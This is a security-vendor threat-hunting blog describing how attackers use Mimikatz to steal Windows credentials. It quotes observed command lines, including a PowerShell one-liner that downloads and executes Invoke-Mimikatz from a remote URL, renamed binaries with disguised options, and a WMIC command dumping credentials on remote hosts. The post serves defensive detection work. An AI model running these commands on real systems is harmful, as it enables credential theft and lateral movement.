<div class="cmp-text" id="text-0cfc4d014b" data-cmp-name="cmp-text-" data-cmp-is="text" data-target-location="false">
    
       <span>This blog shares information on some examples of how the <a href="/en-us/endpoint-security-products/falcon-overwatch-threat-hunting/">CrowdStrike<sup>®</sup> Falcon<sup>® </sup>OverWatch™</a> team has observed the open-source tool known as <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> being used in the wild – including an unusual use of the tool to strictly bypass brittle signature-based detections.

The OverWatch team has comprehensive levels of visibility into attempted attacks against our customers’ infrastructures, and that visibility is extended by the shear breadth of our customer base. This means the OverWatch team is able to observe a wide range of adversary activity from the system visibility provided by the <a href="/en-us/endpoint-security-products/falcon-platform/">Falcon endpoint security platform</a>.
<h2>Credential Access for Privilege Escalation</h2>
One frequently observed aspect of adversary activity is credential access. Actors often seek out valid credentials in order to escalate their privileges and extend their reach within an infrastructure — and they do so via a variety of means. In fact, the OverWatch team has previously observed cases in which adversaries have employed multiple credential theft techniques against a single victim. (An example of adversaries using multiple credential techniques is included in the<a href="/en-us/resources/reports/observations-from-the-front-lines-of-threat-hunting/"> 2018 Falcon OverWatch Report</a>.)
<h2>Mimikatz Techniques</h2>
One popular means of credential access is the use of Mimikatz, described as the <a href="https://twitter.com/dalperovitch/status/826309879086342144">“AK47 of cyber”</a> by CrowdStrike Co-Founder and CTO Dmitri Alperovitch. The OverWatch team regularly sees Mimikatz used by both targeted adversaries and pen testers.
<h3>Changing the Executable Name</h3>
The most simple and direct technique for using this tool is for the actor to copy it to a compromised system, change the name of the executable and launch it using, for example, the following command line:

<code>c:\ProgramData\p.exe <p> </p>&#34;&#34;privilege::debug&#34;&#34;</code>
<code>&#34;&#34;sekurlsa::logonpasswords&#34;&#34;</code>

This allows the actor to access credential information on a system.
<h3>Using a Batch File</h3>
Other means of launching this tool that have been observed include using a batch file to copy the tool over to target systems; launching the tool and sending the output to a file; copying the output files back to a central collection point; and finally, deleting all relevant files off of the target systems.
<h3>Using a PowerShell Variant</h3>
Another means of gaining access to credential information that OverWatch analysts have observed is the use of a <a href="/en-us/blog/is-there-such-a-thing-as-a-malicious-powershell-command/">PowerShell</a> variant of Mimikatz, as seen in the following example:

<code>powershell <p> </p>-ep Bypass -NoP -NonI -NoLogo -c IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent&lt;.&gt;com//Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Command &#39;privilege::debug </code>sekurlsa<code>::</code>logonpasswords<code> exit&#39;</code>
<h3>Changing Command Line Options</h3>
During the last quarter of 2018, OverWatch analysts observed a different use of the Mimikatz tool, specifically one that appears to have been modified to change the command line options. It appears as follows:

<code>mnl.exe pr::dg </code>sl<code>::lp et -p</code>

This specific variant of Mimikatz was run against multiple target systems through the use of WMIC.exe, as illustrated below:

<code>Wmic <p> </p>/NODE:&#34;&#34; /USER:&#34;&#34; /password: process call create &#34;cmd.exe /c (c:\windows\security\mnl.exe pr::dg </code>sl<code>::lp et -p &gt;c:\windows\security\PList.txt) &gt;&gt; c:\windows\temp\temp.txt&#34;</code>
<h2>Monitoring for IOAs Is Crucial</h2>
These techniques are clearly an attempt to evade brittle detection approaches that only rely on looking at command line options of the executable to infer its purpose, or checking for presence of relevant strings in the binary file. While there are a number of techniques that actors can employ to access credential information, <a href="/en-us/endpoint-security-products/falcon-platform/">the Falcon platform</a> provides a level of visibility that allows defenders to see new techniques being used, even when those techniques are specifically aimed at evading or subverting detection mechanisms.

This further demonstrates the value of <a href="/en-us/blog/understanding-indicators-attack-ioas-power-event-stream-processing-crowdstrike-falcon/">monitoring for Indicators of attack (IOAs)</a>, which focus on behavioral aspects of attacker techniques, rather than focusing only on typical <a href="/en-us/blog/indicators-attack-vs-indicators-compromise/">indicators of compromise (IOCs)</a>, such as file names, hashes or single command line options.
